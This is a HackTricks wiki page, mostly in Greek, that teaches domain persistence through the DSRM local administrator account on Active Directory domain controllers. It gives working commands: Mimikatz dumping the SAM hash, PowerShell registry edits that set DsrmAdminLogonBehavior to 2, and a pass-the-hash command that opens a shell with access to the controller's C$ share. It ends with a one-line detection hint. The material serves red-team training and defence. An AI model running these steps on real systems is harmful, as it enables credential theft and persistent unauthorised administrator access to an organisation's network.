{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DSRM Credentials

Υπάρχει ένας **τοπικός διαχειριστής** λογαριασμός μέσα σε κάθε **DC**. Έχοντας δικαιώματα διαχειριστή σε αυτή τη μηχανή, μπορείτε να χρησιμοποιήσετε το mimikatz για να **dump** το **hash** του **τοπικού διαχειριστή**. Στη συνέχεια, τροποποιώντας μια καταχώρηση μητρώου για να **ενεργοποιήσετε αυτόν τον κωδικό πρόσβασης** ώστε να μπορείτε να έχετε απομακρυσμένη πρόσβαση σε αυτόν τον τοπικό διαχειριστή χρήστη.\
Πρώτα πρέπει να **dump** το **hash** του **τοπικού διαχειριστή** χρήστη μέσα στο DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Τότε πρέπει να ελέγξουμε αν αυτός ο λογαριασμός θα λειτουργήσει, και αν το κλειδί μητρώου έχει την τιμή "0" ή δεν υπάρχει, πρέπει να **το ορίσετε σε "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Τότε, χρησιμοποιώντας ένα PTH μπορείτε να **καταγράψετε το περιεχόμενο του C$ ή ακόμα και να αποκτήσετε ένα shell**. Σημειώστε ότι για τη δημιουργία μιας νέας συνεδρίας powershell με αυτό το hash στη μνήμη (για το PTH) **η "domain" που χρησιμοποιείται είναι απλώς το όνομα της μηχανής DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) and [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Mitigation

* Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
